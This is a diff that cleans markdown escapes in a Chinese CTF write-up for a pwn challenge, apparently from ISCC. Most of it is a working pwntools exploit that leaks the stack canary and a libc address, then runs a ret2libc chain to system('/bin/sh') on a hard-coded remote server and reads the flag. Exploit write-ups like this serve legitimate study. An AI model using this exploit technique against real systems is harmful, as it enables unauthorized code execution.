@@ -45,7 +45,7 @@ Canary的设计特性是低字节固定为\\x00，用于防止字符串函数直
 
 payload结构为：24字节padding + canary + 8字节覆盖rbp + ROP链。
 
-puts@got中存放的值被打印出来后，减去libc中puts的固定偏移即得到libc基地址。本地提供的libc为2.31版本，但远程服务器泄露的偏移与本地不匹配。通过比对泄露值与各版本libc符号表，确认远程实际使用libc6\_2.23-0ubuntu11.3\_amd64，关键偏移如下：
+puts@got中存放的值被打印出来后，减去libc中puts的固定偏移即得到libc基地址。本地提供的libc为2.31版本，但远程服务器泄露的偏移与本地不匹配。通过比对泄露值与各版本libc符号表，确认远程实际使用libc6_2.23-0ubuntu11.3_amd64，关键偏移如下：
 
 - puts: 0x6F6A0
 
@@ -59,123 +59,123 @@ puts@got中存放的值被打印出来后，减去libc中puts的固定偏移即�
 
 最终ROP链为标准ret2libc套路：
 
-payload = padding(24) + canary + padding(8) + ret(gadget) + pop\_rdi + binsh\_addr + system\_addr
+payload = padding(24) + canary + padding(8) + ret(gadget) + pop_rdi + binsh_addr + system_addr
 
 其中额外插入一个ret指令是为了满足Ubuntu 64位系统对栈16字节对齐的要求，避免system内部movaps指令触发段错误。执行后system("/bin/sh")启动shell，即可读取flag。
 
 Exp
 
-\`\`\`python
+```python
 
 \#!/usr/bin/env python3
 
-from pwn import \*
+from pwn import *
 
 import re
 
-context(os="linux", arch="amd64", log\_level="debug")
+context(os="linux", arch="amd64", log_level="debug")
 
 binary = ELF("./entrance", checksec=False)
 
-local\_libc = ELF("./libc6\_2.31-0ubuntu9.17\_amd64.so", checksec=False)
+local_libc = ELF("./libc6_2.31-0ubuntu9.17_amd64.so", checksec=False)
 
 context.binary = binary
 
-TARGET\_HOST = "39.96.193.120"
+TARGET_HOST = "39.96.193.120"
 
-TARGET\_PORT = 10007
+TARGET_PORT = 10007
 
-RUN\_MODE = "remote"
+RUN_MODE = "remote"
 
-\# offsets confirmed for remote: libc6\_2.23-0ubuntu11.3\_amd64
+# offsets confirmed for remote: libc6_2.23-0ubuntu11.3_amd64
 
-OFF\_PUTS = 0x6F6A0
+OFF_PUTS = 0x6F6A0
 
-OFF\_SYSTEM = 0x453A0
+OFF_SYSTEM = 0x453A0
 
-OFF\_BINSH = 0x18CE57
+OFF_BINSH = 0x18CE57
 
-POP\_RDI = 0x4018F3
+POP_RDI = 0x4018F3
 
-RET\_ADDR = 0x40101A
+RET_ADDR = 0x40101A
 
-PAD\_SIZE = 24
+PAD_SIZE = 24
 
 def connect():
 
-if RUN\_MODE == "remote":
+if RUN_MODE == "remote":
 
-return remote(TARGET\_HOST, TARGET\_PORT)
+return remote(TARGET_HOST, TARGET_PORT)
 
-elif RUN\_MODE == "local":
+elif RUN_MODE == "local":
 
 return process("./entrance")
 
 else:
 
-raise SystemExit(f"unknown mode: {RUN\_MODE}")
+raise SystemExit(f"unknown mode: {RUN_MODE}")
 
-def bypass\_secret(r):
+def bypass_secret(r):
 
 r.sendlineafter(b"Enter token length:", b"72")
 
 r.sendlineafter(b"access key:", b"hack")
 
-def dump\_canary(r):
+def dump_canary(r):
 
 r.recvuntil(b"hello\\n")
 
-r.send(b"A" \* (PAD\_SIZE + 1))
+r.send(b"A" * (PAD_SIZE + 1))
 
 resp = r.recvuntil(b".congratulate to you")
 
-marker = resp.index(b"A" \* (PAD\_SIZE + 1))
+marker = resp.index(b"A" * (PAD_SIZE + 1))
 
-leak\_bytes = resp\[marker + PAD\_SIZE + 1 : marker + PAD\_SIZE + 8\]
+leak_bytes = resp[marker + PAD_SIZE + 1 : marker + PAD_SIZE + 8]
 
-canary\_val = b"\\x00" + leak\_bytes
+canary_val = b"\\x00" + leak_bytes
 
-log.success("canary =&gt; %s", canary\_val.hex())
+log.success("canary =&gt; %s", canary_val.hex())
 
-return canary\_val
+return canary_val
 
-def dump\_libc(r, canary\_val):
+def dump_libc(r, canary_val):
 
 stage1 = flat(
 
-b"B" \* PAD\_SIZE,
+b"B" * PAD_SIZE,
 
-canary\_val,
+canary_val,
 
-b"C" \* 8,
+b"C" * 8,
 
-p64(POP\_RDI),
+p64(POP_RDI),
 
-p64(binary.got\["puts"\]),
+p64(binary.got["puts"]),
 
-p64(binary.plt\["puts"\]),
+p64(binary.plt["puts"]),
 
-p64(binary.sym\["main"\]),
+p64(binary.sym["main"]),
 
 )
 
 r.send(stage1)
 
-r.recvuntil(b"\[System\] Welcome to the system!")
+r.recvuntil(b"[System] Welcome to the system!")
 
 marker = b"It is good to see you \\n"
 
-data = r.recvuntil(b"\\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\\n")
+data = r.recvuntil(b"\\n*********************************************\\n")
 
-leak\_raw = data\[data.index(marker) + len(marker) : data.index(b"\\n\*\*\*\*\*\*\*\*\*")\]
+leak_raw = data[data.index(marker) + len(marker) : data.index(b"\\n*********")]
 
-puts\_real = u64(leak\_raw.ljust(8, b"\\x00"))
+puts_real = u64(leak_raw.ljust(8, b"\\x00"))
 
-log.success("puts@libc =&gt; %\#x", puts\_real)
+log.success("puts@libc =&gt; %\#x", puts_real)
 
-return puts\_real
+return puts_real
 
-def reenter\_func3(r):
+def reenter_func3(r):
 
 r.recvuntil(b"hello\\n")
 
@@ -183,43 +183,43 @@ r.send(b"Z\\x00")
 
 r.recvuntil(b".congratulate to you")
 
-if RUN\_MODE == "local":
+if RUN_MODE == "local":
 
-OFF\_PUTS = local\_libc.sym\["puts"\]
+OFF_PUTS = local_libc.sym["puts"]
 
-OFF\_SYSTEM = local\_libc.sym\["system"\]
+OFF_SYSTEM = local_libc.sym["system"]
 
-OFF\_BINSH = next(local\_libc.search(b"/bin/sh\\x00"))
+OFF_BINSH = next(local_libc.search(b"/bin/sh\\x00"))
 
 r = connect()
 
-bypass\_secret(r)
+bypass_secret(r)
 
-canary\_val = dump\_canary(r)
+canary_val = dump_canary(r)
 
-puts\_real = dump\_libc(r, canary\_val)
+puts_real = dump_libc(r, canary_val)
 
-base\_libc = puts\_real - OFF\_PUTS
+base_libc = puts_real - OFF_PUTS
 
-log.success("libc base =&gt; %\#x", base\_libc)
+log.success("libc base =&gt; %\#x", base_libc)
 
-reenter\_func3(r)
+reenter_func3(r)
 
 stage2 = flat(
 
-b"D" \* PAD\_SIZE,
+b"D" * PAD_SIZE,
 
-canary\_val,
+canary_val,
 
-b"E" \* 8,
+b"E" * 8,
 
-p64(RET\_ADDR),
+p64(RET_ADDR),
 
-p64(POP\_RDI),
+p64(POP_RDI),
 
-p64(base\_libc + OFF\_BINSH),
+p64(base_libc + OFF_BINSH),
 
-p64(base\_libc + OFF\_SYSTEM),
+p64(base_libc + OFF_SYSTEM),
 
 )
 
@@ -227,15 +227,15 @@ r.send(stage2)
 
 r.recvuntil(b"It is good to see you \\n")
 
-r.sendline(b"cat /flag\* 2&gt;/dev/null; cat flag\* /flag\* 2&gt;/dev/null; exit")
+r.sendline(b"cat /flag* 2&gt;/dev/null; cat flag* /flag* 2&gt;/dev/null; exit")
 
 output = r.recvall(timeout=5)
 
-flag\_match = re.search(rb"(ISCC|flag)\\{\[\^}\]+\\}", output)
+flag_match = re.search(rb"(ISCC|flag)\\{[\^}]+\\}", output)
 
-if flag\_match:
+if flag_match:
 
-print("\[+\] FLAG:", flag\_match.group().decode())
+print("[+] FLAG:", flag_match.group().decode())
 
 else:
 
@@ -243,4 +243,4 @@ print(output.decode("latin-1", errors="replace"))
 
 r.close()
 
-\`\`\`
+```
